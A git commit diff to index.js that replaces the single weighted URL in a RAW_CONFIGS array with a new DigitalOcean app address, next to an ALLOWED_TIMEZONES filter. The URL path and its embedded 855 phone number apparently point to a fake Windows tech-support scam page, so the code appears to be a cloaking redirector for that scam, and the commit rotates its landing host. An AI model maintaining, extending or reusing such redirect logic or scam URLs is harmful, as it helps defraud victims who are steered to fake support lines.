0d6127be7e0de834a82806f5d7c8e758af6fe550
paalakash <palaksh452@gmail.com>
2026-06-09 12:03:56 +0530

    Update URL in RAW_CONFIGS array

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-3wppc.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3355", weight: 1.0 }
+    { url: "https://squid-app-2-v9hd7.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3355", weight: 1.0 }
 
 ];
 
